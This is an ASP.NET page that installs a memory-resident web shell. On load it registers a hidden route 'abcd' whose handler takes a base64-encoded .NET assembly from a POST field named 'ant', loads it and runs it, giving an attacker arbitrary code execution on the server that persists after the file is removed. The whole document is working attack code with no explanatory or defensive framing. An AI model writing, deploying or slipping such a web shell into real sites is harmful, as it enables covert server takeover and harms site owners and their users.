<%@ Page Language="c#"%>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Web.Routing" %>

<script runat="server">
    public class MyRoute : IRouteHandler
    {
        public IHttpHandler GetHttpHandler(RequestContext requestContext)
        {
            return new MyHandler(requestContext);
        }
    }

    public class MyHandler : IHttpHandler
    {
        public RequestContext RequestContext { get; private set; }

        public MyHandler(RequestContext context)
        {
            this.RequestContext = context;
        }

        public bool IsReusable
        {
            get { return false; }
        }

        public void ProcessRequest(HttpContext context)
        {
            String Payload = context.Request.Form["ant"];
            if (Payload != null)
            {
                System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));
                assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(context);
                context.Response.End();
            }
            context.Response.End();
        }
    }
</script>

<%
    Response.Write("ok");
    RouteTable.Routes.Insert(0, new Route("abcd", new MyRoute()));
%>